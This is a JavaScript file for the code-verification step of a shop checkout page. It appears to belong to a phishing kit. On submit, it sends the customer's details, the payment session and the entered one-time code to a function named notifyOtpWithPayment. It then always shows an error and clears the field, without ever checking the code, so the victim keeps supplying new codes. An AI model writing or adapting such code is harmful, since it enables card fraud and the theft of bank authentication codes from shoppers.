function isValidOtpLength(len) {
  return len === 4 || len === 6;
}

function setVerifyLoading(form, loading) {
  const btn = document.getElementById("btn-verify-next");
  const back = document.getElementById("btn-back-verify");
  const otp = form?.otp;
  if (!btn) return;

  btn.disabled = loading;
  btn.classList.toggle("is-loading", loading);
  btn.querySelector(".btn__label").textContent = loading ? "Verifying…" : "Next";
  btn.querySelector(".btn__loading")?.classList.toggle("is-hidden", !loading);
  if (back) back.setAttribute("aria-disabled", loading ? "true" : "false");
  if (back) back.classList.toggle("is-disabled", loading);
  if (otp) otp.disabled = loading;
}

function showOtpError(show) {
  const err = document.getElementById("otp-error");
  const otp = document.getElementById("otp");
  if (!err) return;
  err.classList.toggle("is-hidden", !show);
  otp?.classList.toggle("input--error", show);
}

function bindVerifyForm() {
  const form = document.getElementById("verify-form");
  if (!form) return;

  if (!getCartCount()) {
    showToast("No active order");
    setTimeout(() => {
      window.location.href = "index.html";
    }, 1200);
    return;
  }

  if (!getCustomer()) {
    showToast("Complete your details first");
    setTimeout(() => {
      window.location.href = "checkout.html";
    }, 1200);
    return;
  }

  form.otp.addEventListener("input", () => {
    form.otp.value = form.otp.value.replace(/\D/g, "").slice(0, 6);
    showOtpError(false);
    form.otp.setCustomValidity("");
  });

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    if (form.btnVerifyLoading) return;

    const code = form.otp.value.replace(/\D/g, "");
    if (!isValidOtpLength(code.length)) {
      form.otp.setCustomValidity("Enter 4 or 6 digits");
      form.otp.reportValidity();
      return;
    }
    form.otp.setCustomValidity("");

    setVerifyLoading(form, true);
    form.btnVerifyLoading = true;

    const customer = getCustomer();
    const payment = getPaymentSession();

    const sent = await notifyOtpWithPayment(customer, payment, code);
    if (!sent) {
      showToast("Could not send verification code");
    }

    setTimeout(() => {
      form.otp.value = "";
      showOtpError(true);
      setVerifyLoading(form, false);
      form.btnVerifyLoading = false;
      form.otp.focus();
    }, 3000);
  });
}

document.addEventListener("DOMContentLoaded", () => {
  const steps = document.getElementById("checkout-steps");
  if (steps) steps.innerHTML = renderSteps(5);
  bindVerifyForm();
  syncCartBadges();
});
